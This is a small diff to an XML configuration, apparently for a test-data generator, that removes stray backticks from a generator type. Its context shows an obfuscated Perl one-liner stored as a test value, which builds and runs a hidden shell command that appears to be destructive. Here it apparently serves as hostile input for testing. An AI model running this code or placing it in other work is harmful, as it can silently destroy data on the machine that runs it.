@@ -269,7 +269,7 @@
         <value>no warnings;
           `$=`;$_=\%!;($_)=/(.)/;$==++$|;($.,$/,$,,$\,$",$;,$^,$#,$~,$*,$:,@%)=($!=~/(.)(.).(.)(.)(.)(.)..(.)(.)(.)..(.)......(.)/,$"),$=++;$.++;$.++;$_++;$_++;($_,$\,$,)=($~.$"."$;$/$%[$?]$_$\$,$:$%[$?]",$"&amp;$~,$#,);$,++;$,++;$^|=$";`$_$\$,$/$:$;$~$*$%[$?]$.$~$*${#}$%[$?]$;$\$"$^$~$*.>&amp;$=`
         </value>
-        <generator type="`personal_sensitive`"/>
+        <generator type="personal_sensitive"/>
         <encoder type="csv">
           <input into="strings_to_encode" into_datastore="clients">
             <generator type="person"/>
